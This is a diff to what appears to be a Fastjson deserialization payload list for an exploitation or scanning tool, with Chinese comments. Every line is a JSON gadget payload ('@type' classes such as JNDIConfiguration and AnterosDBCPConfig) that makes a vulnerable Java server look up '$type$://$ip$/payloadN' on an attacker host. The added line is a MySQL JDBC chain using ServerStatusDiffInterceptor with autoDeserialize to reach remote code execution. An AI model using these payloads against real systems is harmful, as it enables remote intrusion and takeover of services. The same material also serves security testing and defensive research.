@@ -18,3 +18,4 @@
 {"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"$type$://$ip$/payload18"} #未知
 {"@type":"org.apache.openjpa.ee.RegistryManagedRuntime","registryName":"$type$://$ip$/payload19","rollbackOnly":null} #未知
 {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"$type$://$ip$/payload20"} #未知
+{"x":{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"$ip$","portToConnectTo":80,"info":{"user":"root","password":"ubuntu","useSSL":"false","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"},"databaseToConnectTo":"mysql","url":""}} #mysql jdbc链
